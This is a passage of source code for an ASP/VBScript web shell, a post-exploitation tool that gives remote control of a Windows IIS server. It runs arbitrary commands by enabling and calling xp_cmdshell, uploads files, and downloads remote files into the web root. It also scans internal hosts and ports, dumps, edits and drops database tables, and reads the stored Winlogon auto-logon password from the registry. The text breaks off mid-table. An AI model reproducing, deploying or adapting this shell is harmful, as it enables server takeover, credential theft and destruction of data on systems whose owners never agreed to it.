<%@ CODEPAGE="65001" Language=VBScript%>

<html>
<head>
<style>
	a{text-decoration:none; color:blue;}
	form{margin:1}
	body{margin:1}
	a{color: #0000ff;text-decoration:none;}
	a:hover{color: #f00;text-decoration:Underline;}
	.alt0 td{font-weight:bold;border-top:1px solid #ffffff;border-bottom:1px solid #aaaaaa;background:#c0c0ff;padding:4px 4px 4px 4px;}
	.alt1 td{border-top:1px solid #ffffff;border-bottom:1px solid #aaaaaa;background:#f1f1f1;padding:4px 4px 4px 4px;}
	.alt2 td{border-top:1px solid #ffffff;border-bottom:1px solid #aaaaaa;background:#d0d0d0;padding:4px 4px 4px 4px;}
</style>
</head>
<body>
	<form method='POST' action='' name='form_signal'>
	<input type=hidden name='submit1'>
	<input type=hidden name='submit2'>
	<input type=hidden name='submit3'>
	<input type=hidden name='submit4'>
	<input type=hidden name='submit5'>
	</form>

<%
server.scripttimeout=600
Response.Charset="UTF-8"
Response.Expires=-1
Session.Timeout=60
Response.Buffer = true

common_object = Split("Scripting.FileSystemObject#WScript.Shell#WScript.Shell.1#Shell.Application#Shell.Application.1#WScript.Network#Shell.UsersAdodb.Stream#Microsoft.XMLHTTP#MSXML2.XMLHTTP#hzhost.modules#Scripting.Dictionary#Adodb.Connection#ADOX.Catalog#JRO.JetEngine#Adodb.RecordSet#SoftArtisans.FileUp#LyfUpload.UploadFile#Persits.Upload.1#JMail.SmtpMail#CDONTS.NewMail#SmtpMail.SmtpMail.1","#")

Main
Function Main()
On Error Resume Next
	If InStr(Request.ServerVariables("Content_Type"), "multipart/form-data") Then
		doUpload()
		makePrimaryList
		formFolderElement session("location"), "", ""
	Else
		login
		makePrimaryList
		Select Case Decode(Request.Form("submit1"))
		Case "CMD"
			formCMD()
		Case "FOLDER"
			formFolder()
		Case "SVINFO"
			formServerInfo()
		Case "NETSCAN"
			formNetScan()
		Case "URLD"
			formUrlD()
		Case "DATABASE"
			formDB()
		Case ELSE
			formFolder()
		End Select
	End If
ErrAlert
End Function

Function SV_Var(s)
	SV_Var = Request.ServerVariables(s)
End Function

Function readable(x)
On Error Resume Next
	Set objFSO = CreateObject("Scripting.FileSystemObject")
	Set f = objFSO.GetFolder(x)
	If Err Then
		readable = 0
	Else
		readable = 1
	End If
	Err.Clear
	Set objFSO = Nothing
End Function

Function writable(x)
On Error Resume Next
	Set objFSO = CreateObject("Scripting.FileSystemObject")
	sFile = x&objFSO.GetTempName
	objFSO.CreateTextFile(sFile)
	If Err Then
		writable = 0
	Else
		writable = 1
		objFSO.DeleteFile(sFile)
	End If
	Err.Clear
	Set objFSO = nothing	
End Function

Function usuable(x)
On Error Resume Next
	Set obj = createObject(x)
	If Err Then
		usuable = 0
	Else
		usuable = 1
		Set obj = Nothing
	End If
	Err.Clear
End Function

Function html_encode(str)
	str = CStr(str)
	If IsNull(str) Or str = "" Then 
		html_encode = ""
	Else
		html_encode = Server.HTMLEncode(str)
	End If
End Function

Function doQuery(query, pgnum, objAC)
On Error Resume Next
	Set objAR = CreateObject("ADODB.RecordSet")
	objAR.Open query,objAC,1,1

	If (Not(objAR Is Nothing)) And objAR.State = 1 Then
		objAR.PageSize = 20
		If pgnum = "" Then pgnum = 1
		If Not objAR.eof Then objAR.AbsolutePage = pgnum%>
		<table width=100% align=left>
		<tr><td><form method=POST action='' name='form_tab'>
			There are <b><% response.write objAR.RecordCount%> Records</b> and <b><% response.write objAR.PageCount%> Pages</b>.
			Page Number:<input type=text name='pgnum' value='<% response.write pgnum%>' style='width:30pt'>
			<input type=button name='go' value='GO' onclick="gotoquery('<% response.write Encode(query)%>',-1)">
		</form></td></tr>
		</table>
		<table width=100% align=left cellspacing=0>
			<tr class='alt0'><td>Operation</td>
<%			For p=0 To objAR.Fields.Count-1%>
				<td><% response.write objAR.Fields(p).Name%></td>
<%			Next%>
			</tr>
<%			For i=1 To objAR.PageSize
				If objAR.Eof Then Exit For%>
				<tr class='alt1' onmouseover='this.className="alt2"' onmouseout='this.className="alt1"'>
				<td align=center><a href="javascript:editTable(<% response.write i%>)">Edit</a> | <a href="javascript:db_delete('<% response.write pgnum%>','<% response.write i%>')">Delete</a></td>
<%				For p=0 To objAR.Fields.Count-1%>
					<td><% response.write objAR(p)%></td>
<%				Next%>
				</tr>
<%				objAR.MoveNext
			Next%>
		</table>
	<%	objAR.Close
		Set objAR = Nothing
	End If
ErrAlert
End Function

Function doColumn(smt4, objAC)
On Error Resume Next
	tbl_cols = ""
	Set rs = objAC.OpenSchema(20)
	rs.MoveFirst
	If smt4 = "" Then smt4 = rs(2)
	Do While Not rs.eof
		If rs(3) = "TABLE" Then
			If rs(2) = smt4 Then
				tbl_cols = tbl_cols & "<table width=100% align=left cellspacing=0><tr align=left class='alt2'><td>" & rs(2) & "</td></tr></table><table width=100% align=left cellspacing=0><tr align=left class='alt0'><td>List</td><td>Type</td><td>Size</td><td>Nullable</td></tr>"
				Set objAR = CreateObject("ADODB.RecordSet")
				objAR.Open ("Select * From "&rs(2)),objAC,1,1
				For Each x In objAR.Fields
					tbl_cols = tbl_cols & "<tr class='alt1' onmouseover='this.className=\'alt2\'' onmouseout='this.className=\'alt1\''><td>" & x.Name & "</td><td>" & typeStr(x.Type) & "</td>"
					If x.DefinedSize <> 0 Then
						tbl_cols = tbl_cols & "<td>" & x.DefinedSize & "</td>"
					Else
						tbl_cols = tbl_cols & "<td>" & x.Precision & "</td>"
					End If
					If (x.Attributes And 32) = 32 Then 
						tbl_cols = tbl_cols & "<td>True</td>"
					Else
						tbl_cols = tbl_cols & "<td>False</td>"
					End If
					tbl_cols = tbl_cols & "</tr>"
				Next
				tbl_cols = tbl_cols & "</table>"
				Set objAR = nothing
			End If
		End If
		rs.MoveNext
	Loop%>
<%	Response.write tbl_cols
ErrAlert
End Function

Sub formAuthentication
On Error Resume Next
	If Decode(Request.Form("submit2")) <> "" Then
		smt3 = Decode(Request.Form("submit3"))
		nPos2 = 1
		nPos1 = InStr(nPos2, smt3, "Server=", 1) + 7
		nPos2 = InStr(nPos1, smt3, ",", 1)
		session("db_ip") = Mid(smt3, nPos1, nPos2-nPos1)
		
		nPos1 = InStr(nPos2, smt3, ",", 1) + 1
		nPos2 = InStr(nPos1, smt3, ";Database=", 1)
		session("db_port") = Mid(smt3, nPos1, nPos2-nPos1)
		
		nPos1 = InStr(nPos2, smt3, "Database=", 1) + 9
		nPos2 = InStr(nPos1, smt3, ";Uid=", 1)
		session("db_name") = Mid(smt3, nPos1, nPos2-nPos1)

		nPos1 = InStr(nPos2, smt3, "Uid=", 1) + 4
		nPos2 = InStr(nPos1, smt3, ";Pwd=", 1)
		session("db_user") = Mid(smt3, nPos1, nPos2-nPos1)

		nPos1 = InStr(nPos2, smt3, "Pwd=", 1) + 4
		session("db_pswd") = Mid(smt3, nPos1, Len(smt3)-nPos1+1)
	Else
		session("db_ip") = "127.0.0.1"
		session("db_port") = "1433"
		session("db_name") = ""
		session("db_user") = "sa"
		session("db_pswd") = ""
	End If
%>
	<center>
	<form method=POST action="" name='form_db'>
		<br>
		<select onchange="">
		<option value='mssql'>MSSQL
		</select>
		Host:<input type=text name='host_ip' style='width:80pt' value='<% response.write session("db_ip")%>'>:<input type=text name='host_port' style='width:30pt' value='<% response.write session("db_port")%>'>
		User:<input type=text name='user' style='width:80pt' value='<% response.write session("db_user")%>'>
		Password:<input type=text name='pswd' style='width:80pt' value='<% response.write session("db_pswd")%>'>
		Database:<input type=text name='db' style='width:80pt' value='<% response.write session("db_name")%>'>
		<input type=button name='connect' value='Connect' onclick="showColumn('')">
	</form>
	</center>
<%
ErrAlert
End Sub

Sub formQuery
On Error Resume Next
	If Decode(Request.Form("submit2")) = "CMD" Then
		session("db_cmd_path") = Decode(Request.Form("submit4"))
		If session("db_cmd_path") = "" Then session("db_cmd_path") = "C:\windows\system32\cmd.exe"
		session("db_command") = Decode(Request.Form("submit5"))
		If session("db_command") = "" Then session("db_command") = "/c set"
		content = session("db_cmd_content")
	Else
		If session("db_cmd_path") = "" Then session("db_cmd_path") = "C:\windows\system32\cmd.exe"
		If session("db_command") = "" Then session("db_command") = "/c set"
	End If
%>
	<table width=100%>
		<form method=POST action='' name='form_db_cmd'>
			<tr align=right>
			<td>Cmd Path:</td>
			<td width=90%><input type=text name='db_cmd_path' style='width:100%' value='<% response.write session("db_cmd_path")%>'></td>
			<td><input type=button value='Extend' onclick='db_cmd_extend()' style='width:100%'></td>
			<tr align=right>
				<td>Command:</td><td width=90%><input type=text name='db_command' style='width:100%' value='<% response.write session("db_command")%>' onkeydown="if (event.keyCode == 13) db_cmd_exec();"></td>
				<td><input type=button name='btn_db_cmd_exec' value='Exec' onclick="db_cmd_exec()" style='width:100%'></td>
			</tr>
			<tr align=right>
				<td>Result:</td><td><textarea readonly name='db_cmd_result' style='width:100%;height:<% response.write 		UBound(Split(content,vbCrLf))*15%>pt'><% response.write content%></textarea></td>
			</tr>
			<tr><td colspan=3 bgcolor=#b0b0b0></td></tr>
		</form>

		<form method=POST action='' name='form_query'>
			<tr align=right><td width=2000>Query:</td><td width=100%><textarea style='width:100%;' name='sql_query'><% response.write html_encode(session("QUERY"))%></textarea></td>
			<td><input type=button name='btn_query' value='Query' onclick="gotoquery('',1)" style='width:100%'></td>
			</tr>
		</form>
	</table>
<%
ErrAlert
End Sub

Sub formTableList(objAC)
On Error Resume Next
	Set rs = objAC.OpenSchema(20)%>
	<table width=50% align=left cellspacing=0>
	<th colspan=2 align=left bgcolor=#c0c0ff>Store House:<% response.write rs(0)%></th>
<%	rs.MoveFirst
	Do While Not rs.eof
		If rs(3) = "TABLE" Then%>
			<tr class='alt1' onmouseover='this.className="alt2"' onmouseout='this.className="alt1"'><td><a href="javascript:gotoquery('<% response.write Encode("SELECT * FROM "&rs(2))%>',1)">Table: <% response.write rs(2)%></a></td><td style='width:180pt' align=center><a href="javascript:dumpTable('<% response.write Encode(rs(2))%>')">Dump</a> | <a href="javascript:insertIntoTable('<% response.write Encode(rs(2))%>')">Insert</a> | <a href="javascript:showColumn('<% response.write Encode(rs(2))%>')">Structure</a> | <a href="javascript:dropTable('<% response.write Encode(rs(2))%>')">Drop</a></td></tr>
<%		End If
		rs.MoveNext
	Loop%>
	</table>
<%	Set rs = Nothing
ErrAlert
End Sub

Function formDB()
On Error Resume Next
	smt2 = Decode(Request.Form("submit2"))
	smt3 = Decode(Request.Form("submit3"))
	smt4 = Decode(Request.Form("submit4"))
	smt5 = Decode(Request.Form("submit5"))
	formAuthentication
	If smt2 <> "" Then
		Set objAC = CreateObject("ADODB.Connection")
		objAC.Open smt3
		If objAC.State <> 1 Then Exit Function

		Select Case smt2
		Case "QUERY"
			session("QUERY") = smt4
		Case "DROPTABLE"
			doDBDropTable smt4, objAC
		Case "CMD"
			doCmdExec objAC
		Case "CMDEXTEND"
			doCmdExtension objAC
		Case Else
		End Select

		formQuery
		formTableList(objAC)

		Set rs = objAC.OpenSchema(20)
		If smt4 = "" Then smt4 = rs(2)
		Set rs = Nothing

		Select Case smt2
		Case "DUMP"
			doDumpTable smt4, objAC
		Case "COLUMN"
			doColumn smt4, objAC
		Case "DATA"
			query = "SELECT * FROM "&smt4
			session("QUERY") = query
			doQuery query, smt5, objAC
		Case "QUERY"
			query = session("QUERY")
			doQuery query, smt5, objAC
		Case "FORMEDIT"
			formDBEdit smt4, smt5, objAC
		Case "UPDATE"
			doDBUpdate smt4, smt5, objAC
		Case "DELETE"
			doDBDelete smt4, smt5, objAC
		Case "FORMINSERT"
			formDBInsert smt4, objAC
		Case "INSERT"
			doDBInsert smt4, objAC
		End Select
		objAC.Close
		Set objAC = Nothing
	End If
ErrAlert
End Function

Function typeStr(flag)
	Dim str
	Select Case flag
	Case 0 : str="EMPTY"
	Case 2 : str="SMALLINT"
	Case 3 : str="INTEGER"
	Case 4 : str="REAL"
	Case 5 : str="FLOAT"
	Case 6 : str="CURRENCY"
	Case 7 : str="DATE"
	Case 8 : str="BSTR"
	Case 9 : str="IDISPATCH"
	Case 10 : str="ERROR"
	Case 11 : str="BIT"
	Case 12 : str="SQL_VARIANT"
	Case 13 : str="IUNKNOWN"
	Case 14 : str="DECIMAL"
	Case 16 : str="TINYINT"
	Case 17 : str="TINYINT"
	Case 18 : str="UNSIGNEDSMALLINT"
	Case 19 : str="UNSIGNEDINT"
	Case 20 : str="BIGINT"
	Case 21 : str="UNSIGNEDBIGINT"
	Case 72 : str="GUID"
	Case 128 : str="BINARY"
	Case 129 : str="CHAR"
	Case 130 : str="NCHAR"
	Case 131 : str="NUMERIC"
	Case 132 : str="USERDEFINED"
	Case 133 : str="DBDATE"
	Case 134 : str="DBTIME"
	Case 135 : str="DATETIME"
	Case 136 : str="CHAPTER"
	Case 200 : str="VARCHAR"
	Case 201 : str="TEXT"
	Case 202 : str="NVARCHAR"
	Case 203 : str="NTEXT"
	Case 204 : str="VARBINARY"
	Case 205 : str="IMAGE"
	Case Else : str=flag
	End Select
	typeStr=str
End Function

Function doDumpTable(smt4, objAC)
On Error Resume Next
	DumpText = "Drop Table ["&smt4&"]"&vbCrLf
	DumpText = DumpText & "Create Table ["&smt4&"] ("&vbCrLf
	Set objAR = CreateObject("ADODB.RecordSet")
	objAR.Open "SELECT * FROM "&smt4, objAC, 1, 1
	For p=0 To objAR.Fields.Count-1
		Set f = objAR.Fields(p)
		DumpText = DumpText&"["&f.Name&"] "&typeStr(f.Type)

		If f.Type = 128 Or f.Type = 129 Or f.Type = 130 Or f.Type = 202 Or f.Type = 204 Or f.Type = 200 Then 'Binary,Char,nchar,nvarchar,varbinary,varchar
			DumpText = DumpText&"("&f.DefinedSize&")"
		End If
		If f.Type = 14 Or f.Type = 131 Then DumpText = DumpText&"("&f.Precision&","&f.NumbericScale&")"

		If (f.Attributes And 32) = 32 Then
			DumpText = DumpText&" NULL"
		Else
			DumpText = DumpText&" NOT NULL"
		End If
		If p <> objAR.Fields.Count-1 Then DumpText = DumpText&","
		DumpText = DumpText & vbCrLf
	Next
	DumpText = DumpText&")"&vbCrLf
	objAR.MoveFirst
	Do While Not objAR.Eof
		DumpText = DumpText & "Insert Into ["&smt4&"] ("
		For p=0 To objAR.Fields.Count-1
			Set f = objAR.Fields(p)
			DumpText = DumpText&"["&f.Name&"]"
			If p <> objAR.Fields.Count-1 Then DumpText = DumpText&","
		Next
		DumpText = DumpText&") Values ("
		For p=0 To objAR.Fields.Count-1
			If objAR(p) <> "" Then
				DumpText = DumpText&"N'"&objAR(p)&"'"
			Else
				DumpText = DumpText&"Null"
			End If
			If p <> objAR.Fields.Count-1 Then DumpText = DumpText&","
		Next
		DumpText = DumpText&");"&vbCrLf
		objAR.MoveNext
	Loop

	FileName = smt4&".sql"
	IsAttachment = "attachment; "
	Response.Clear
	Response.AddHeader "Content-Disposition", IsAttachment & "filename=" & FileName
	Response.AddHeader "Content-Length", Len(DumpText)+2
	Response.Charset = "UTF-8"
	Response.ContentType = FileContentType
	Response.Write DumpText
	Response.Flush
ErrAlert
End Function

Function doCmdExtension(objAC)
On Error Resume Next
	objAC.Execute("EXEC sp_configure 'show advanced options', 1")
	objAC.Execute("RECONFIGURE")
	objAC.Execute("EXEC sp_configure 'xp_cmdshell', 1")
	objAC.Execute("RECONFIGURE")
ErrAlert
End Function

Function doCmdExec(objAC)
On Error Resume Next
	smt4 = Decode(Request.Form("submit4"))
	smt5 = Decode(Request.Form("submit5"))
	
	Set objFSO = CreateObject("Scripting.FileSystemObject")
	query = "EXEC " & session("db_name") & "..xp_cmdshell '" & smt4 & " " & smt5 & " 2>&1'"
	Set objAR = objAC.Execute(query)
	objAR.MoveFirst
	For i = 1 To objAR.PageSize
		If objAR.EOF Then Exit For
		content = content & objAR(0) & vbCrLf
		objAR.MoveNext
	Next
	session("db_cmd_content") = content
ErrAlert
End Function

Function getTableFromQueryString(query, objAC)
On Error Resume Next
	Set rs = objAC.OpenSchema(20)
	rs.MoveFirst
	Do While Not rs.eof
		If rs(3) = "TABLE" And InStr(query, rs(2)) Then 
			getTableFromQueryString = rs(2)
			Exit Do
		End If
		rs.MoveNext
	Loop
ErrAlert
End Function

Function doDBDropTable(tbl, objAC)
On Error Resume Next
	query_drop_table = "Drop Table " & tbl
	objAC.Execute(query_drop_table)
	session("QUERY") = ""
ErrAlert
End Function

Function doDBDelete(pgnum, index, objAC)
On Error Resume Next
	query = session("QUERY")
	tbl = getTableFromQueryString(query,objAC)
'	DELETE FROM spt_values WHERE name='sub' AND number='-1';
	query_delete = "Delete From " & tbl & " Where "
	Set objAR = CreateObject("ADODB.RecordSet")
	objAR.Open query,objAC,1,1
	objAR.PageSize = 20
	If Not objAR.eof Then objAR.AbsolutePage = pgnum
	For i=1 To objAR.PageSize
		If objAR.Eof Then Exit For
		If i = CInt(index) Then
			For p=0 To objAR.Fields.Count-1
				If objAR(p) <> "" Then
					query_delete = query_delete & objAR.Fields(p).Name & "='" & objAR(p) & "'"
					If p <> objAR.Fields.Count-1 Then query_delete = query_delete & " AND "
				End If
			Next
		End If
		objAR.MoveNext
	Next
	query_delete = query_delete & ";"
	objAR.Close
	Set objAR = Nothing

	objAC.Execute(query_delete)
	doQuery query, objAC, pgnum
ErrAlert
End Function

Function doDBInsert(tbl, objAC)
On Error Resume Next
	query_insert = "Insert Into " & tbl & " ("
	Set objAR = CreateObject("ADODB.RecordSet")
	query = "Select * From " & tbl
	objAR.Open query,objAC,1,1
	For p=0 To objAR.Fields.Count-1
		query_insert = query_insert & objAR.Fields(p).Name
		If p <> objAR.Fields.Count-1 Then query_insert = query_insert & ","
	Next
	query_insert = query_insert & ") Values ("
	For p=0 To objAR.Fields.Count-1
		v = Request.Form(objAR.Fields(p).Name)
		If v <> "" Then
			query_insert = query_insert & "'" & v & "'"
		Else
			query_insert = query_insert & "Null"
		End If
		If p <> objAR.Fields.Count-1 Then query_insert = query_insert & ","
	Next
	query_insert = query_insert & ")"
	objAC.Execute(query_insert)
	doQuery query, objAC, 1
ErrAlert
End Function

Function doDBUpdate(pgnum, index, objAC)
On Error Resume Next
	query = session("QUERY")
	tbl = getTableFromQueryString(query,objAC)
	
	query_update = "Update " & tbl & " Set "
	
	Set objAR = CreateObject("ADODB.RecordSet")
	objAR.Open query,objAC,1,1
	objAR.PageSize = 20
	If Not objAR.eof Then objAR.AbsolutePage = pgnum
	For p=0 To objAR.Fields.Count-1
		If Request.Form(objAR.Fields(p).Name) <> "" Then
			query_update = query_update & objAR.Fields(p).Name & "='" & Request.Form(objAR.Fields(p).Name) & "'"
		Else
			query_update = query_update & objAR.Fields(p).Name & "=Null"
		End If
		If p <> objAR.Fields.Count-1 Then query_update = query_update & ","
	Next
	query_update = query_update & " Where "
	objAR.MoveFirst
	For i=1 To objAR.PageSize
		If objAR.Eof Then Exit For
		If i = CInt(index) Then
			For p=0 To objAR.Fields.Count-1
				If objAR(p) <> "" Then
					query_update = query_update & objAR.Fields(p).Name & "='" & objAR(p) & "'"
					If p <> objAR.Fields.Count-1 Then query_update = query_update & " AND "
				End If
			Next
		End If
		objAR.MoveNext
	Next
	query_update = query_update & ";"
	objAR.Close
	Set objAR = Nothing

	objAC.Execute(query_update)
	For Each er In objAC.Errors
		alertStr(er.Description)
		er.Clear
	Next
	doQuery query, objAC, pgnum
ErrAlert
End Function

Function formDBInsert(tbl, objAC)
On Error Resume Next
	Set objAR = CreateObject("ADODB.RecordSet")
	query = "Select * From " & tbl
	objAR.Open query,objAC,1,1
	objAR.PageSize = 20
	If Not objAR.eof Then objAR.AbsolutePage = 1%>
	<form method=POST action='' name='form_db_insert'>
	<table width=100% align=left>
		<input type=hidden name='submit1'>
		<input type=hidden name='submit2'>
		<input type=hidden name='submit3'>
		<input type=hidden name='submit4'>
<%		For p=0 To objAR.Fields.Count-1%>
			<th bgcolor=#c0c0ff width=<% response.write 1/(objAR.Fields.Count+1)*100%>%><% response.write objAR.Fields(p).Name%></th>
<%		Next%>
		<th bgcolor=#c0c0ff width=<% response.write 1/(objAR.Fields.Count+1)*100%>%></th><tr>
<%		For p=0 To objAR.Fields.Count-1%>
			<td><input type=text name="<% response.write objAR.Fields(p).Name%>" style='width:100%'></td>
<%		Next%>
		<td><input type=button name='btn_insert_db' value='Insert' onclick="db_insert('<% response.write Encode(tbl)%>')" style='width:100%'></td></tr>
	</table>
	</form>
<%	objAR.Close
	Set objAR = Nothing
ErrAlert
End Function

Function formDBEdit(pgnum, index, objAC)
On Error Resume Next
	Set objAR = CreateObject("ADODB.RecordSet")
	query = session("QUERY")
	objAR.Open query,objAC,1,1
	objAR.PageSize = 20
	If Not objAR.eof Then objAR.AbsolutePage = pgnum%>
	<form method=POST action='' name='form_db_update'>
	<table width=100% align=left>
		<input type=hidden name='submit1'>
		<input type=hidden name='submit2'>
		<input type=hidden name='submit3'>
		<input type=hidden name='submit4'>
		<input type=hidden name='submit5'>
<%		For p=0 To objAR.Fields.Count-1%>
			<th bgcolor=#c0c0ff width=<% response.write 1/(objAR.Fields.Count+1)*100%>%><% response.write objAR.Fields(p).Name%></th>
<%		Next%>
		<th bgcolor=#c0c0ff width=<% response.write 1/(objAR.Fields.Count+1)*100%>%></th>
<%		For i=1 To objAR.PageSize
			If objAR.Eof Then Exit For
			If i = CInt(index) Then%>
				<tr>
<%				For p=0 To objAR.Fields.Count-1%>
					<td><input type=text name="<% response.write objAR.Fields(p).Name%>" value="<% response.write objAR(p)%>" style='width:100%'></td>
<%				Next%>
				<td><input type=button name='btn_update_db' value='Update' onclick='db_update(<% response.write pgnum%>,<% response.write index%>)' style='width:100%'></td>
				</tr>
<%				Exit For
			End If
			objAR.MoveNext
		Next%>
	</table>
	</form>
<%	objAR.Close
	Set objAR = Nothing
ErrAlert
End Function

Function formUrlD()
On Error Resume Next
	smt2 = Decode(request.form("submit2"))
	txt = request.form("Content")
	If txt <> "" Then session("url_cont") = txt
	If session("url_cont") = "" Then session("url_cont") = "http://127.0.0.1|C:\Inetpub\wwwroot\1.htm"

%>	<form method='POST' name='form_urld' action=''>
	<input type=hidden name='submit1'>
	<input type=hidden name='submit2'>
	<table width=500pt align=center>
	<tr>
	<td width=100%>
	<textarea name='Content' style='width:100%;height:100pt;'><% response.write session("url_cont")%></textarea>
	</td>
	<td>
	<input type=button name='download' value='Download' onclick='doUrlD()'>
	</td>
	</tr>
	</table>
	</form>

<%	If smt2 = "Download" Then
		Set objAS = CreateObject("Adodb.Stream")
		Set objMX = CreateObject("MSXML2.XMLHTTP")
%>		<table width=500pt align=center>
		<th bgcolor=#e0e0e0>Source</th>
		<th bgcolor=#e0e0e0>Target</th>
<%		For Each x In Split(txt,chr(13)&chr(10))
			src = Split(x,"|")(0): dst = Split(x,"|")(1)
			If src <> "" And dst <> "" Then
				objMX.Open "GET",src,False
				objMX.Send
				If Err Then 
%>					<tr><td colspan=2>Error:<% response.write Err.Description%> Source:<% response.write Err.Source%></td></tr>
<%					Err.Clear
				Else
					With objAS
						.Type = 1
						.Mode = 3
						.Open
						.Write objMX.ResponseBody
						.Position = 0
						.SaveToFile dst,2
						.Close
					End With
					If Err Then
%>						<tr><td colspan=2>Error:<% response.write dst&Err.Description%> Source:<% response.write Err.Source%></td></tr>
<%						Err.Clear
					Else
%>						<tr><td><% response.write src%></td><td><% response.write dst%></td></tr>
<%					End If
				End If
			End If
		Next
		Set objAS = Nothing
		Set objMX = Nothing
%>		</table>
<%	End If
ErrAlert
End Function

Function formNetScan()
On Error Resume Next
	smt2 = Decode(request.form("submit2"))
	smt3 = Decode(request.form("submit3"))
	smt4 = Decode(request.form("submit4"))

	If smt3 <> "" Then session("ips") = smt3
	If smt4 <> "" Then session("ports") = smt4
	If session("ips") = "" Then session("ips") = "127.0.0.1"
	If session("ports") = "" Then session("ports") = "21,23,80,1433,1521,3306,3389,4899,8080,43958,65500"
	
%>
	<form method=POST name='form_netscan'>
	<table width=500pt align=center>
	<tr>
	<td>IP:</td><td colspan=2><input type=text name='ip' style='width:100%' value='<% response.write session("ips")%>'></td>
	</tr>
	<tr>
	<td>Port:</td><td width=100%><input type=text name='port' style='width:100%' value='<% response.write session("ports")%>'></td><td><input type=button name='btn_scan' value='Scan' onclick='netscan()'></td>
	</tr>
	</table>
	</form>
<%
	If smt2 = "SCAN" Then
		session("NETSCAN_IP") = smt3
		session("NETSCAN_PORT") = smt4
%>
		<table width=500pt align=center cellspacing=0>
		<tr bgcolor=#d0d0d0 align=left><td colspan=2>Scanning...</td></tr>
<%		For Each ip In Split(smt3,",")
			For Each port In Split(smt4,",")
%>					<tr align=left class='alt1' onmouseover='this.className="alt2"' onmouseout='this.className="alt1"'>
					<td>
					<% response.write ip&":"&port%>
					</td>
					<%If doNetScan(ip, port) = 1 Then
						Response.Write "<td style='color:blue'>Opened</td>"
						session(ip&","&port) = 1
					Else
						Response.Write "<td style='color:red'>Closed</td>"
						session(ip&","&port) = 0
					End If
					%>
					</td>
					</tr>
<%			Next
		Next
%>		<tr bgcolor=#d0d0d0 align=left><td colspan=2>Completed.</td></tr>
		</table>
<%
	ElseIf session("NETSCAN_IP") <> "" And session("NETSCAN_PORT") <> "" Then%>
		<table width=500pt align=center cellspacing=0>
<%		For Each ip In Split(session("NETSCAN_IP"),",")
			For Each port In Split(session("NETSCAN_PORT"),",")
%>					<tr align=left class='alt1' onmouseover='this.className="alt2"' onmouseout='this.className="alt1"'>
					<td>
					<% response.write ip&":"&port%>
					</td>
					<%If session(ip&","&port) = 1 Then
						Response.Write "<td style='color:blue'>Opened</td>"
					Else
						Response.Write "<td style='color:red'>Closed</td>"
					End If
					%>
					</td>
					</tr>
<%			Next
		Next
%>		</table>
<%
	End If
ErrAlert
End Function

Function doNetScan(ip, port)
On Error Resume Next
	Set objSD = CreateObject("ADODB.Connection")
	objSD.ConnectionTimeout = 1
	objSD.Open "Provider=SQLOLEDB.1;Data Source="&ip&","&port&";User ID=user1;Password=user1;"
	ret = 1
	If Err Then
		If Err.Number = -2147217843 Or Err.Number = -2147467259 Then
			If InStr(Err.Description,"(Connect()).") > 0 Then
				ret = 0
			End If
		Response.Flush
		End If
	End If
	Err.Clear
	doNetScan = ret
End Function

Function formServerInfo()
On Error Resume Next
	Set objFSO = CreateObject("Scripting.FileSystemObject")
	Set objWS = CreateObject("WScript.Shell")
	Set objEnv = objws.Environment("SYSTEM")

	OS_Name = CStr(objEnv("OS"))
	prs_num = objEnv("NUMBER_OF_PROCESSORS")
	If IsEmpty(prs_num) Then prs_num = SV_Var("NUMBER_OF_PROCESSORS")

	AltDefaultUserName=objws.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AltDefaultUserName")
	if AltDefaultUserName="" Then AltDefaultUserName="Administrator"

	DontDisplayLastUserName=objws.regRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\DontDisplayLastUserName")
	If DontDisplayLastUserName="" or DontDisplayLastUserName=0 Then tmp=" = " else tmp=" != "
	
	AutoAdminLogon = objWs.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoAdminLogon")
	If AutoAdminLogon = 0 Or AutoAdminLogon = "" Then
		AutoAdminLogon = "Not Used"
	Else
		AutoAdminLogon = "Used"
		DefaultUserName=objWs.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultUserName")
		DefaultPassword=objWs.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultPassword")
		AutoAdminLogon = AutoAdminLogon & "(User Name:"&DefaultUserName&", Password:"&DefaultPassword&")"
	End If
	SysPath = objWs.Environment.Item("Path")
	SysPathArray = Split(SysPath, ";")
%>	<table width=100%>
	<tr><td>
	<table width=100% align=left cellspacing=0>
		<tr align=center class='alt0'><td colspan=4>Server Main Information</td></tr>
		<tr class='alt1' onmouseover='this.className="alt2"' onmouseout='this.className="alt1"'>
			<td bgcolor=#d0d0d0><b>Server Address</b></td>
			<td style='color:#0000ff'>
				Internal : <% response.write SV_Var("SERVER_NAME")%>, External : <% response.write SV_Var("LOCAL_ADDR")%>, Port : <% response.write SV_Var("SERVER_PORT")%>
			</td>
			<td bgcolor=#d0d0d0><b>Server Time</b></td>
			<td style='color:#0000ff'>
				<% response.write CStr(now())%>
			</td>
		</tr>

		<tr class='alt1' onmouseover='this.className="alt2"' onmouseout='this.className="alt1"'>
			<td bgcolor=#d0d0d0><b>Server OS</b></td>
			<td style='color:#0000ff'>
				<% response.write OS_Name%>
			</td>
			<td bgcolor=#d0d0d0><b>IIS Version</b></td>
			<td style='color:#0000ff'>
				<% response.write SV_Var("SERVER_SOFTWARE")%>
			</td>
		</tr>
		<tr class='alt1' onmouseover='this.className="alt2"' onmouseout='this.className="alt1"'>
			<td bgcolor=#d0d0d0><b>Script Time(sec)</b></td>
			<td style='color:#0000ff'>
				<% response.write Server.ScriptTimeout%>
			</td>
			<td bgcolor=#d0d0d0><b>Script Engine Version</b></td>
			<td style='color:#0000ff'>
				<% response.write ScriptEngine&"/"&ScriptEngineMajorVersion&"/"&ScriptEngineMinorVersion&"."& ScriptEngineBuildVersion%>
			</td>
		</tr>
		<tr class='alt1' onmouseover='this.className="alt2"' onmouseout='this.className="alt1"'>
			<td bgcolor=#d0d0d0><b>Shell Path</b></td>
			<td style='color:#0000ff'>
				<% response.write SV_Var("PATH_TRANSLATED")%>
			</td>
			<td bgcolor=#d0d0d0><b>Server Variables</b></td>
			<td style='color:#0000ff'>
				<% response.write Request.ServerVariables.Count%>
			</td>
		</tr>
		<tr class='alt1' onmouseover='this.className="alt2"' onmouseout='this.className="alt1"'>
